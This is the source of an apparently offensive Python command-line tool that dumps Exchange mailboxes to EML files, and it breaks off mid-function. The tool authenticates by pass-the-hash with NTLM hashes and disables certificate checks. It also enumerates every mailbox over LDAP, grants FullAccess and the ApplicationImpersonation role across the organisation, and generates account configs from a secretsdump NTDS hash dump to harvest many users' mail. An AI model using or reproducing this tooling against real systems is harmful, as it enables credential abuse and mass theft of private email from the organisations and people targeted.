#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mail Crawler - Exchange Version
"""

import tomllib
import os
import sys
import logging
import datetime
from pathlib import Path
from typing import List, Dict, Optional, Tuple
import typer
from exchangelib import Credentials, Account, DELEGATE, IMPERSONATION, Configuration, Version, Build
from exchangelib.folders import FolderCollection
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
from exchangelib.protocol import Protocol, CachingProtocol
import urllib3
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn
import re

# Import custom NTLM hash authentication
from core.ntlm_auth import HttpNtlmHashAuth, NTLMHashProtocol, _parse_ntlm_hash

# disable InsecureRequestWarning when connecting to servers with self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# UUID Regex
UUID_REGEX = re.compile(r"[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}", re.IGNORECASE)

# Pure Integer Regex
PURE_INTEGER_REGEX = re.compile(r"^\d+$")

# setup logging (handlers will be reconfigured once config is loaded)
logger = logging.getLogger(__name__)


app = typer.Typer(
    name="mailcrawler",
    help="Mail Crawler - Exchange Dump Tool",
    no_args_is_help=True,
)

_DEFAULT_CONFIG = Path("config.toml")


def _resolve_config_path(config: Optional[Path]) -> Path:
    """Parse configuration file path, defaulting to config.toml in the same directory as the executable when packaged as EXE"""
    if config is not None:
        return config
    if getattr(sys, "frozen", False):
        return Path(sys.executable).parent / "config.toml"
    return _DEFAULT_CONFIG


def _setup_logging(log_file: str) -> None:
    """Initialize logging handlers based on configuration"""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler(log_file, encoding="utf-8"),
            logging.StreamHandler(),
        ],
    )


def load_config_toml(config_path: Path) -> tuple[dict, dict]:
    """Load configuration from a TOML file"""
    if not config_path.exists():
        typer.echo(f"❌ Configuration file {config_path} does not exist!", err=True)
        raise typer.Exit(1)
    try:
        with open(config_path, "rb") as f:
            data = tomllib.load(f)
        accounts = data.get("accounts", {})
        crawler = data.get("crawler", {})
        return accounts, crawler
    except tomllib.TOMLDecodeError as e:
        typer.echo(f"❌ Configuration file format error: {e}", err=True)
        raise typer.Exit(1)


def check_folder_name(folder_name: str) -> bool:
    """
    Check if the folder name is valid

    Args:
        folder_name: Folder name

    Returns:
        bool: Whether the folder name is valid
    """
    black_list = ["System", "Versions"]
    # Check if UUID exists
    if UUID_REGEX.search(folder_name):
        return False
    # Check if it is a pure integer
    if PURE_INTEGER_REGEX.fullmatch(folder_name):
        return False
    # Check if it is in the blacklist
    if folder_name in black_list:
        return False
    return True


class EmailCrawler:
    def __init__(
        self,
        email_address: str,
        username: str | None,
        password: str | None = None,
        exchange_server: str = None,
        port: int = None,
        ntlm_hash: str | None = None,
        output_dir: str = "exports",
        access_type: str = "delegate",
    ):
        """
        Initialize the email crawler - Exchange version

        Args:
            email_address: Email address
            username: Username (must include domain for hash authentication, e.g., DOMAIN\\username)
            password: Email password (used for plaintext authentication)
            exchange_server: Exchange server address (optional, autodiscover will be used if not provided)
            port: Exchange port (optional)
            ntlm_hash: NTLM hash string, takes precedence over password. Supports pure NT hash (32 hexadecimal characters) or LM:NT format.
            output_dir: Root directory for exported email files
            access_type: "delegate" (default) or "impersonation". Use "impersonation" when the credentials belong to a service/admin account with ApplicationImpersonation role and email_address is the target user mailbox.
        """
        self.email_address = email_address
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.exchange_server = exchange_server
        self.port = port
        self.account = None
        self.output_dir = output_dir
        self.access_type = access_type

    def connect(self) -> bool:
        """
        Connect to the Exchange server

        Returns:
            bool: Whether the connection was successful
        """
        try:
            logger.info(f"Connecting to Exchange server: {self.email_address}")

            # Disable SSL verification (if using self-signed certificates)
            BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

            if self.ntlm_hash:
                # --- NTLM Hash Authentication (Pass-the-Hash) Path ---
                logger.info("Using NTLM Hash Authentication (Pass-the-Hash)")

                raw_username = self.username or self.email_address

                # Parse the hash (returns hexadecimal strings)
                nt_hash_hex, lm_hash_hex = _parse_ntlm_hash(self.ntlm_hash)

                # Construct the hash authentication object (using full DOMAIN\\username as the spnego credential username)
                hash_auth = HttpNtlmHashAuth(
                    username=raw_username,
                    nt_hash_hex=nt_hash_hex,
                    lm_hash_hex=lm_hash_hex,
                )

                if not self.exchange_server:
                    raise ValueError("NTLM hash authentication requires manual specification of exchange_server, autodiscover is not supported")

                # exchangelib requires Credentials, pass a placeholder (actual authentication is handled by hash_auth)
                credentials = Credentials(username=raw_username, password="placeholder_unused")
                config = Configuration(
                    server=self.exchange_server,
                    credentials=credentials,
                    auth_type="NTLM",
                )
                # Account internally creates Protocol(config=config) and does not accept an external protocol parameter.
                # First, create the Account normally (at this point, CachingProtocol caches the original Protocol instance),
                # then delete the cache entry, create NTLMHashProtocol (cache miss → actual instantiation),
                # and finally replace account.protocol to ensure the replacement is done before any EWS requests are made.
                _exchangelib_access_type = IMPERSONATION if self.access_type == "impersonation" else DELEGATE
                self.account = Account(
                    primary_smtp_address=self.email_address,
                    config=config,
                    autodiscover=False,
                    access_type=_exchangelib_access_type,
                )
                # Delete the cache entry in CachingProtocol to trigger actual instantiation of NTLMHashProtocol(config=...)
                del Protocol[config]
                self.account.protocol = NTLMHashProtocol(
                    config=config,
                    ntlm_hash_auth=hash_auth,
                )
            else:
                # --- Plain Password Authentication Path (keep original logic)---
                logger.info("Using plain password authentication")
                if self.username:
                    credentials = Credentials(username=self.username, password=self.password)
                else:
                    credentials = Credentials(username=self.email_address, password=self.password)

                _exchangelib_access_type = IMPERSONATION if self.access_type == "impersonation" else DELEGATE
                if self.exchange_server:
                    config = Configuration(server=self.exchange_server, credentials=credentials, auth_type="NTLM")
                    self.account = Account(primary_smtp_address=self.email_address, config=config, autodiscover=False, access_type=_exchangelib_access_type)
                else:
                    self.account = Account(primary_smtp_address=self.email_address, credentials=credentials, autodiscover=True, access_type=_exchangelib_access_type)

            logger.info("Exchange connection successful")
            return True
        except Exception as e:
            logger.error(f"Exchange connection failed: {e}")
            import traceback

            logger.error(traceback.format_exc())
            return False

    def get_all_folders(self) -> List[Tuple[str, str]]:
        """
        Get all mailbox folders

        Returns:
            List[Tuple[str, str]]: List of folders, tuple format is (folder object, folder name)
        """
        try:
            logger.info("Fetching Exchange folder list...")
            folder_list = []

            # Recursively get all folders
            def get_folders_recursive(folder):
                try:
                    folder_name = folder.name
                    folder_list.append((folder, folder_name))

                    # Recursively get child folders
                    if hasattr(folder, "children") and folder.children:
                        for child in folder.children:
                            get_folders_recursive(child)
                except Exception as e:
                    logger.warning(f"Error processing folder: {e}")

            # Start from the root folder
            get_folders_recursive(self.account.root)

            logger.info(f"Found {len(folder_list)} folders")
            return folder_list
        except Exception as e:
            logger.error(f"Error fetching folder list: {e}")
            return []

    def get_recent_emails(self, days: int = 30) -> Dict[str, List[Tuple[str, object]]]:
        """
        Get recent emails

        Args:
            days: Number of days, default is 30. If set to 0, fetch all emails (no time limit).

        Returns:
            Dict[str, List[Tuple[str, object]]]: Emails grouped by folder
        """
        try:
            # Calculate date range
            if days == 0:
                logger.info(f"Fetching all emails (no time limit)")
                since_date = None
            else:
                since_date = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=days)
                logger.info(f"Fetching emails from the last {days} days (since {since_date.strftime('%Y-%m-%d')})")

            folders = self.get_all_folders()
            all_emails = {}

            # Using rich progress bar
            with Progress() as progress:
                folders_task = progress.add_task("[green]Traversing folders...", total=len(folders))

                for folder_obj, folder_name in folders:
                    # Check folder name validity
                    if not check_folder_name(folder_name):
                        logger.info(f"Skipping invalid folder: {folder_name}")
                        progress.update(folders_task, advance=1)
                        continue
                    try:
                        # Update progress bar with current folder
                        progress.update(folders_task, folder_name=f"[{folder_name}]")
                        logger.info(f"Processing folder: {folder_name}")

                        # Get emails in the folder
                        try:
                            # Decide whether to filter emails based on days value
                            if since_date is None:
                                # If days=0, get all emails
                                items = folder_obj.all()
                            else:
                                # Filter recent emails
                                items = folder_obj.filter(datetime_received__gte=since_date)
                            email_count = items.count()

                            logger.info(f"Found {email_count} emails in folder {folder_name}")

                            emails_in_folder = []

                            # Iterate through emails
                            with Progress() as progress:
                                emails_task = progress.add_task(f"[cyan]Processing emails...", total=email_count)
                                for idx, item in enumerate(items):
                                    try:
                                        # Save email object and ID
                                        email_id = f"{idx+1}"
                                        emails_in_folder.append((email_id, item))
                                    except Exception as e:
                                        logger.error(f"Error processing email: {e}")
                                        continue
                                    finally:
                                        progress.update(emails_task, advance=1)

                            all_emails[folder_name] = emails_in_folder

                        except Exception as e:
                            logger.warning(f"Folder {folder_name} does not support email operations or is empty: {e}")
                            progress.update(folders_task, advance=1)
                            continue

                        # folders_task
                        progress.update(folders_task, advance=1)

                    except Exception as e:
                        logger.error(f"Error processing folder {folder_name}: {e}")
                        progress.update(folders_task, advance=1)
                        continue

            return all_emails

        except Exception as e:
            logger.error(f"Error fetching emails: {e}")
            import traceback

            logger.error(traceback.format_exc())
            return {}

    def save_eml_files(self, emails: Dict[str, List[Tuple[str, object]]]) -> int:
        """
        Save emails as eml files

        Args:
            emails: Email data

        Returns:
            int: Number of successfully saved files
        """
        saved_count = 0

        # Calculate total number of emails
        total_emails = sum(len(email_list) for email_list in emails.values())

        if total_emails == 0:
            logger.info("No emails to save")
            return 0

        # Create the resolved output directory only when emails are actually being saved
        os.makedirs(self.output_dir, exist_ok=True)

        # Use rich progress bar
        with Progress() as progress:
            emails_task = progress.add_task("[green]Saving emails...", total=total_emails)

            for folder, email_list in emails.items():
                # Create directory corresponding to the folder
                folder_dir = os.path.join(self.output_dir, self._sanitize_folder_name(folder))
                os.makedirs(folder_dir, exist_ok=True)

                for email_id, item in email_list:
                    try:
                        # Get email subject
                        subject = item.subject if item.subject else "No Subject"

                        # Truncate subject for display
                        display_subject = subject[:40] + "..." if len(subject) > 40 else subject
                        progress.update(emails_task, current_info=f"[{folder}] {display_subject}")

                        # Get email received time
                        email_datetime = item.datetime_received

                        # Generate filename
                        filename = self._generate_filename(email_id, subject, email_datetime)
                        filepath = os.path.join(folder_dir, filename)

                        # Get MIME content and save as eml file
                        mime_content = item.mime_content
                        with open(filepath, "wb") as f:
                            f.write(mime_content)

                        logger.info(f"Saved: {filepath}")
                        saved_count += 1

                        # Update progress
                        progress.update(emails_task, advance=1)

                    except Exception as e:
                        logger.error(f"Error saving email {email_id}: {e}")
                        # Update progress even if an error occurs
                        progress.update(emails_task, advance=1)
                        continue

        return saved_count

    def _sanitize_folder_name(self, folder_name: str) -> str:
        """
        Sanitize folder name to make it suitable as a directory name

        Args:
            folder_name: Original folder name

        Returns:
            str: Sanitized folder name
        """
        # Replace unsafe characters
        unsafe_chars = ["/", "\\", ":", "*", "?", '"', "<", ">", "|"]
        for char in unsafe_chars:
            folder_name = folder_name.replace(char, "_").strip()
        return folder_name

    def _generate_filename(self, email_id: str, subject: str, email_datetime: datetime.datetime = None) -> str:
        """
        Generate filename

        Args:
            email_id: Email ID
            subject: Email subject
            email_datetime: Email received time

        Returns:
            str: Filename
        """
        # Sanitize subject to remove unsafe characters
        unsafe_chars = ["/", "\\", ":", "*", "?", '"', "<", ">", "|"]
        for char in unsafe_chars:
            subject = subject.replace(char, "_").strip()

        # Limit filename length
        if len(subject) > 100:
            subject = subject[:100] + "..."

        # Use email received time, if not available use current time
        if email_datetime:
            # Convert to local time
            timestamp = email_datetime.astimezone().strftime("%Y%m%d_%H%M%S")
        else:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        filename = f"{timestamp}_{email_id}_{subject}.eml"

        return filename

    def disconnect(self):
        """Disconnect from the Exchange server"""
        if self.account:
            try:
                logger.info("Exchange connection closed")
                self.account = None
            except Exception as e:
                logger.error(f"Error closing Exchange connection: {e}")

    def run_crawler(self, days: int = 30) -> bool:
        """
        Run the crawler

        Args:
            days: Number of days to fetch, default is 30. If set to 0, fetch all emails (no time limit)

        Returns:
            bool: Whether the crawler ran successfully
        """
        try:
            # Connect to the mailbox
            if not self.connect():
                return False

            # Fetch emails
            emails = self.get_recent_emails(days)

            if not emails:
                logger.warning("No emails found matching the criteria")
                return True

            total_emails = sum(len(email_list) for email_list in emails.values())
            logger.info(f"Total emails found: {total_emails}")

            # Save emails
            saved_count = self.save_eml_files(emails)
            logger.info(f"Successfully saved {saved_count} emails to {self.output_dir} directory")

            return True

        except Exception as e:
            logger.error(f"Error running crawler: {e}")
            return False
        finally:
            self.disconnect()


def _load_targets_from_config(email_config: dict) -> list[str]:
    """Resolve target mailbox list for impersonation entries."""
    targets: list[str] = list(email_config.get("targets") or [])
    targets_file = email_config.get("targets_file", "")
    if not targets and targets_file:
        tf_path = Path(targets_file)
        if not tf_path.exists():
            typer.echo(f"❌ targets_file not found: {targets_file}", err=True)
            raise typer.Exit(1)
        for line in tf_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    return targets


def _crawl_single(
    email_address: str,
    email_config: dict,
    days: int,
    output_dir: str,
    check_only: bool,
    access_type: str = "delegate",
    label: str = "",
) -> bool:
    """Instantiate EmailCrawler and run crawl (or connection check) for one mailbox."""
    display = label or email_address
    typer.echo(f"  Target: {email_address}")

    crawler = EmailCrawler(
        email_address=email_address,
        username=email_config.get("username"),
        password=email_config.get("password"),
        exchange_server=email_config.get("exchange_server"),
        port=email_config.get("port"),
        ntlm_hash=email_config.get("ntlm_hash"),
        output_dir=output_dir,
        access_type=access_type,
    )
    if not check_only:
        os.makedirs(output_dir, exist_ok=True)

    if check_only:
        ok = crawler.connect()
        crawler.disconnect()
        if ok:
            typer.echo(f"  ✅ {display} Connection successful!")
        else:
            typer.echo(f"  ❌ {display} Connection failed, please check the logs.")
        return ok
    else:
        success = crawler.run_crawler(days)
        if success:
            typer.echo(f"  ✅ {display} Emails exported successfully! → {output_dir}")
        else:
            typer.echo(f"  ❌ {display} Email export failed, please check the logs.")
        return success


def _run_account(key: str, email_config: dict, days: int, base_output_dir: str, check_only: bool) -> bool:
    """Execute crawling (or connection check) for a single account config entry."""
    typer.echo(f"\n{'='*50}")
    typer.echo(f"Processing account: {key}")
    typer.echo(f"{'='*50}")

    access_type = email_config.get("access_type", "delegate").lower()
    typer.echo(f"Access type     : {access_type}")
    typer.echo(f"Exchange server : {email_config.get('exchange_server', 'Auto Discover')}")
    if days == 0:
        typer.echo("Fetch range     : All emails (no time limit)")
    else:
        typer.echo(f"Fetch days      : Last {days} days")

    use_ntlm_hash = bool(email_config.get("ntlm_hash"))
    auth_mode = "NTLM hash (Pass-the-Hash)" if use_ntlm_hash else "Plain password"
    typer.echo(f"Authentication  : {auth_mode}")

    if access_type == "impersonation":
        # Admin credentials impersonating a list of target mailboxes
        targets = _load_targets_from_config(email_config)
        if not targets:
            typer.echo("❌ Impersonation mode requires 'targets' list or 'targets_file' in config.", err=True)
            return False
        typer.echo(f"Impersonation targets: {len(targets)} mailbox(es)")
        results = []
        for target in targets:
            # Use target email as the email_address; admin creds stay in email_config
            target_output = os.path.join(base_output_dir, key, _sanitize_name(target))
            ok = _crawl_single(
                email_address=target,
                email_config=email_config,
                days=days,
                output_dir=target_output,
                check_only=check_only,
                access_type="impersonation",
                label=f"{key}/{target}",
            )
            results.append(ok)
        return all(results)
    else:
        # Delegate or PTH: use email_address from config directly
        key_output_dir = os.path.join(base_output_dir, key)
        typer.echo(f"Email address   : {email_config['email_address']}")
        return _crawl_single(
            email_address=email_config["email_address"],
            email_config=email_config,
            days=days,
            output_dir=key_output_dir,
            check_only=check_only,
            access_type=access_type,
            label=key,
        )


def _sanitize_name(name: str) -> str:
    """Sanitize a string for use as a directory component."""
    for ch in '/\\:*?"<>|':
        name = name.replace(ch, "_")
    return name


@app.command()
def run(
    accounts: Optional[List[str]] = typer.Argument(None, help="Email addresses to process (process all if not specified)"),
    days: Optional[int] = typer.Option(None, "--days", "-d", help="Fetch emails from the last N days, 0 for no limit"),
    output_dir: Optional[str] = typer.Option(None, "--output-dir", "-o", help="Root directory for email output"),
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
    check_only: bool = typer.Option(False, "--check-only", help="Only check connection, do not download emails"),
):
    """Download emails and save as EML files"""
    config_path = _resolve_config_path(config)
    email_configs, crawler_config = load_config_toml(config_path)

    log_file = crawler_config.get("log_file", "email_crawler.log")
    _setup_logging(log_file)

    effective_days = days if days is not None else crawler_config.get("days", 30)
    effective_output = output_dir or crawler_config.get("output_dir", "eml_exports")

    typer.echo("=" * 50)
    typer.echo("Mail Crawler - Exchange Version")
    typer.echo("=" * 50)
    typer.echo(f"Configuration file: {config_path}")
    typer.echo(f"Configured accounts: {', '.join(email_configs.keys())}")

    targets = accounts if accounts else list(email_configs.keys())
    unknown = [a for a in targets if a not in email_configs]
    if unknown:
        typer.echo(f"❌ The following accounts do not exist in the configuration file: {', '.join(unknown)}", err=True)
        raise typer.Exit(1)

    for key in targets:
        _run_account(key, email_configs[key], effective_days, effective_output, check_only)

    typer.echo(f"\n{'='*50}")
    typer.echo("All accounts processed!")
    typer.echo(f"{'='*50}")


@app.command("list")
def list_accounts(
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
):
    """List all configured email accounts in the configuration file"""
    config_path = _resolve_config_path(config)
    email_configs, crawler_config = load_config_toml(config_path)

    typer.echo(f"Configuration file: {config_path}")
    typer.echo(f"\nTotal {len(email_configs)} accounts:\n")
    for key, cfg in email_configs.items():
        auth = "NTLM hash" if cfg.get("ntlm_hash") else "Plaintext password"
        server = cfg.get("exchange_server", "(Auto-discover)")
        typer.echo(f"  [{key}]")
        typer.echo(f"    Email Address : {cfg.get('email_address', key)}")
        typer.echo(f"    Server        : {server}")
        typer.echo(f"    Authentication: {auth}")
        if cfg.get("username"):
            typer.echo(f"    Username      : {cfg['username']}")
        access_type = cfg.get("access_type", "delegate")
        typer.echo(f"    Access Type   : {access_type}")
        if access_type == "impersonation":
            targets_inline = cfg.get("targets") or []
            targets_file = cfg.get("targets_file", "")
            if targets_inline:
                typer.echo(f"    Targets       : {len(targets_inline)} inline")
            elif targets_file:
                typer.echo(f"    Targets File  : {targets_file}")
            else:
                typer.echo("    Targets       : (none configured)")


@app.command()
def check(
    accounts: Optional[List[str]] = typer.Argument(None, help="Email addresses to check (check all if not specified)"),
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
):
    """Check if email connections are working (do not download emails)"""
    config_path = _resolve_config_path(config)
    email_configs, crawler_config = load_config_toml(config_path)

    log_file = crawler_config.get("log_file", "email_crawler.log")
    _setup_logging(log_file)

    targets = accounts if accounts else list(email_configs.keys())
    unknown = [a for a in targets if a not in email_configs]
    if unknown:
        typer.echo(f"❌ The following accounts do not exist in the configuration file: {', '.join(unknown)}", err=True)
        raise typer.Exit(1)

    effective_output = crawler_config.get("output_dir", "eml_exports")

    results = {}
    for key in targets:
        ok = _run_account(key, email_configs[key], 0, effective_output, check_only=True)
        results[key] = ok

    typer.echo(f"\n{'='*50}")
    typer.echo("Connection Check Summary:")
    for key, ok in results.items():
        status = "✅ Success" if ok else "❌ Failure"
        typer.echo(f"  {key}: {status}")
    typer.echo("=" * 50)


def _load_admin_config(
    config_path: Path,
    server: Optional[str],
    username: Optional[str],
    password: Optional[str],
    no_ssl: bool = False,
    port: Optional[int] = None,
):
    """Load admin credentials: CLI args take precedence over config.toml admin block."""
    _, _ = load_config_toml(config_path)  # validate config exists

    with open(config_path, "rb") as f:
        raw = tomllib.load(f)

    admin_block = raw.get("admin", {})
    resolved_server = server or admin_block.get("exchange_server", "")
    resolved_user = username or admin_block.get("username", "")
    resolved_pass = password or admin_block.get("password", "")

    if not resolved_server:
        typer.echo("❌ Exchange server is required. Provide --server or set admin.exchange_server in config.", err=True)
        raise typer.Exit(1)
    if not resolved_user or not resolved_pass:
        typer.echo("❌ Admin credentials are required. Provide --username/--password or set admin block in config.", err=True)
        raise typer.Exit(1)

    ssl = (not no_ssl) if no_ssl else admin_block.get("ssl", True)
    ssl_verify = admin_block.get("ssl_verify", False)
    auth = admin_block.get("auth", "negotiate")
    resolved_port = port or admin_block.get("port") or None
    return resolved_server, resolved_user, resolved_pass, ssl, ssl_verify, auth, resolved_port


@app.command("enum-mailboxes")
def enum_mailboxes(
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file path for the mailbox list (one per line). Prints to stdout if omitted."),
    dc: Optional[str] = typer.Option(None, "--dc", help="Domain controller IP/hostname for LDAP enumeration (default: same as --server)"),
    server: Optional[str] = typer.Option(None, "--server", "-s", help="Exchange server hostname (used as DC if --dc is not given)"),
    domain: Optional[str] = typer.Option(None, "--domain", "-d", help="Domain name for LDAP NTLM auth, e.g. randark.local"),
    username: Optional[str] = typer.Option(None, "--username", "-u", help="Admin username (SAMAccountName, without domain prefix)"),
    password: Optional[str] = typer.Option(None, "--password", "-p", help="Admin password"),
    ldap_port: int = typer.Option(389, "--ldap-port", help="LDAP port (default 389; use 636 for LDAPS)"),
    base_dn: Optional[str] = typer.Option(None, "--base-dn", help="LDAP search base DN (auto-derived from domain if omitted)"),
    user_only: bool = typer.Option(False, "--user-only", help="Filter out system mailboxes (HealthMailbox, SystemMailbox, DiscoverySearchMailbox, FederatedEmail, Migration)"),
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
):
    """Enumerate all mailbox-enabled users via LDAP (NTLM auth, no PowerShell endpoint required)."""
    from core.exchange_admin import LdapMailboxEnumerator

    config_path = _resolve_config_path(config)

    with open(config_path, "rb") as f:
        raw = tomllib.load(f)
    admin_block = raw.get("admin", {})

    resolved_dc = dc or server or admin_block.get("exchange_server", "")
    resolved_user = username or admin_block.get("username", "")
    resolved_pass = password or admin_block.get("password", "")
    resolved_domain = domain or admin_block.get("domain", "")

    if not resolved_dc:
        typer.echo("❌ DC/server is required. Provide --dc/--server or set admin.exchange_server in config.", err=True)
        raise typer.Exit(1)
    if not resolved_user or not resolved_pass:
        typer.echo("❌ Credentials required. Provide --username/--password or set admin block in config.", err=True)
        raise typer.Exit(1)

    # Extract SAMAccountName (strip domain prefix if present)
    sam = resolved_user.split("\\")[-1] if "\\" in resolved_user else resolved_user.split("@")[0]

    # Derive domain from username if not explicitly provided
    if not resolved_domain:
        if "\\" in resolved_user:
            resolved_domain = resolved_user.split("\\")[0]
        elif "@" in resolved_user:
            resolved_domain = resolved_user.split("@")[1]
        else:
            typer.echo("❌ Cannot derive domain. Provide --domain or use DOMAIN\\\\user format.", err=True)
            raise typer.Exit(1)

    use_ldaps = ldap_port == 636
    typer.echo(f"Enumerating mailboxes via LDAP on {resolved_dc}:{ldap_port} (domain={resolved_domain}, user={sam})...")

    enumerator = LdapMailboxEnumerator(
        dc_host=resolved_dc,
        domain=resolved_domain,
        username=sam,
        password=resolved_pass,
        port=ldap_port,
        use_ssl=use_ldaps,
        base_dn=base_dn or None,
    )
    mailboxes = enumerator.enum_mailboxes()
    enumerator.close()

    if user_only:
        _SYSTEM_PREFIXES = (
            "healthmailbox",
            "systemmailbox",
            "discoverysearchmailbox",
            "federatedemail",
            "migration.",
        )
        before = len(mailboxes)
        mailboxes = [m for m in mailboxes if not m.lower().split("@")[0].startswith(_SYSTEM_PREFIXES)]
        typer.echo(f"Filtered {before - len(mailboxes)} system mailbox(es).")

    typer.echo(f"Found {len(mailboxes)} mailbox(es).")

    if output:
        out_path = Path(output)
        out_path.write_text("\n".join(mailboxes), encoding="utf-8")
        typer.echo(f"Mailbox list saved to: {out_path}")
    else:
        for mb in mailboxes:
            typer.echo(mb)


@app.command("grant-access")
def grant_access(
    targets: Optional[List[str]] = typer.Argument(None, help="Target mailbox addresses. If omitted, --all flag or --targets-file is required."),
    trustee: Optional[str] = typer.Option(None, "--trustee", "-t", help="Account to receive FullAccess (defaults to admin username from config)"),
    all_mailboxes: bool = typer.Option(False, "--all", help="Grant FullAccess on ALL mailboxes in the organisation"),
    targets_file: Optional[str] = typer.Option(None, "--targets-file", "-f", help="File containing target mailbox addresses (one per line)"),
    automapping: bool = typer.Option(False, "--automapping", help="Enable Outlook auto-mapping of the mailbox"),
    server: Optional[str] = typer.Option(None, "--server", "-s", help="Exchange server hostname"),
    username: Optional[str] = typer.Option(None, "--username", "-u", help="Admin username"),
    password: Optional[str] = typer.Option(None, "--password", "-p", help="Admin password"),
    no_ssl: bool = typer.Option(False, "--no-ssl", help="Use HTTP (port 5985) instead of HTTPS (port 5986)"),
    port: Optional[int] = typer.Option(None, "--port", help="Override WinRM port"),
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
):
    """Grant FullAccess on target mailboxes to an admin account (Scheme A prerequisite)."""
    from core.exchange_admin import ExchangeAdminSession

    config_path = _resolve_config_path(config)
    resolved_server, resolved_user, resolved_pass, ssl, ssl_verify, auth, resolved_port = _load_admin_config(
        config_path, server, username, password, no_ssl=no_ssl, port=port
    )
    effective_trustee = trustee or resolved_user

    session = ExchangeAdminSession(
        server=resolved_server,
        username=resolved_user,
        password=resolved_pass,
        ssl=ssl,
        ssl_verify=ssl_verify,
        auth=auth,
        port=resolved_port,
    )

    # Resolve target list
    mailbox_list: list[str] = list(targets or [])
    if targets_file:
        tf = Path(targets_file)
        if not tf.exists():
            typer.echo(f"❌ targets-file not found: {targets_file}", err=True)
            raise typer.Exit(1)
        for line in tf.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                mailbox_list.append(line)
    if all_mailboxes:
        typer.echo("Enumerating all mailboxes...")
        mailbox_list = session.enum_mailboxes()

    if not mailbox_list:
        typer.echo("❌ No target mailboxes specified. Use arguments, --targets-file, or --all.", err=True)
        raise typer.Exit(1)

    typer.echo(f"Granting FullAccess on {len(mailbox_list)} mailbox(es) to {effective_trustee}...")
    results = session.grant_fullaccess_bulk(mailbox_list, effective_trustee, automapping=automapping)

    ok_count = sum(1 for v in results.values() if v)
    fail_count = len(results) - ok_count
    typer.echo(f"\n✅ Success: {ok_count}  ❌ Failed: {fail_count}")
    for mb, ok in results.items():
        status = "✅" if ok else "❌"
        typer.echo(f"  {status} {mb}")


@app.command("grant-impersonation")
def grant_impersonation(
    trustee: Optional[str] = typer.Option(None, "--trustee", "-t", help="Account to receive ApplicationImpersonation role (defaults to admin username from config)"),
    assignment_name: Optional[str] = typer.Option(None, "--assignment-name", help="Custom name for the role assignment"),
    server: Optional[str] = typer.Option(None, "--server", "-s", help="Exchange server hostname"),
    username: Optional[str] = typer.Option(None, "--username", "-u", help="Admin username"),
    password: Optional[str] = typer.Option(None, "--password", "-p", help="Admin password"),
    no_ssl: bool = typer.Option(False, "--no-ssl", help="Use HTTP (port 5985) instead of HTTPS (port 5986)"),
    port: Optional[int] = typer.Option(None, "--port", help="Override WinRM port"),
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Configuration file path (default: config.toml)"),
):
    """Grant ApplicationImpersonation role to an account (Scheme B prerequisite)."""
    from core.exchange_admin import ExchangeAdminSession

    config_path = _resolve_config_path(config)
    resolved_server, resolved_user, resolved_pass, ssl, ssl_verify, auth, resolved_port = _load_admin_config(
        config_path, server, username, password, no_ssl=no_ssl, port=port
    )
    effective_trustee = trustee or resolved_user

    session = ExchangeAdminSession(
        server=resolved_server,
        username=resolved_user,
        password=resolved_pass,
        ssl=ssl,
        ssl_verify=ssl_verify,
        auth=auth,
        port=resolved_port,
    )

    typer.echo(f"Granting ApplicationImpersonation to {effective_trustee}...")
    session.grant_impersonation(effective_trustee, assignment_name=assignment_name or "")
    typer.echo(f"✅ ApplicationImpersonation granted to {effective_trustee}.")
    typer.echo("You can now use access_type=\"impersonation\" entries in config.toml.")


@app.command("gen-config")
def gen_config(
    ntds_file: str = typer.Argument(..., help="Path to secretsdump NTLM output file"),
    mailboxes_file: str = typer.Argument(..., help="Path to mailbox list file (one address per line, e.g. from enum-mailboxes)"),
    exchange_server: str = typer.Option(..., "--server", "-s", help="Exchange server hostname to embed in generated entries"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Write merged config to this file instead of stdout"),
    merge: Optional[Path] = typer.Option(None, "--merge", "-m", help="Existing config.toml to merge accounts into"),
    config: Optional[Path] = typer.Option(None, "--config", "-c", help="Base config.toml (used as merge base when --merge not given)"),
):
    """
    Generate config.toml account entries from NTDS hash dump + mailbox list (Scheme C).

    Reads a secretsdump NTLM output and a list of mailbox addresses, cross-references
    them by username, and produces ready-to-use MailCrawler account entries with ntlm_hash.
    """
    import tomli_w
    from core.ntds_helper import parse_secretsdump_output, build_accounts_config

    ntds_path = Path(ntds_file)
    mb_path = Path(mailboxes_file)

    if not ntds_path.exists():
        typer.echo(f"❌ NTDS file not found: {ntds_file}", err=True)
        raise typer.Exit(1)
    if not mb_path.exists():
        typer.echo(f"❌ Mailboxes file not found: {mailboxes_file}", err=True)
        raise typer.Exit(1)

    # Parse inputs
    hash_map = parse_secretsdump_output(ntds_path)
    mailbox_list = [
        line.strip()
        for line in mb_path.read_text(encoding="utf-8").splitlines()
        if line.strip() and not line.strip().startswith("#")
    ]
    typer.echo(f"Loaded {len(hash_map)} hash entries, {len(mailbox_list)} mailboxes.")

    new_accounts = build_accounts_config(hash_map, mailbox_list, exchange_server)
    typer.echo(f"Matched {len(new_accounts)} account(s).")

    # Determine base config to merge into
    base_config_path = merge or config or _resolve_config_path(None)
    if base_config_path.exists():
        with open(base_config_path, "rb") as f:
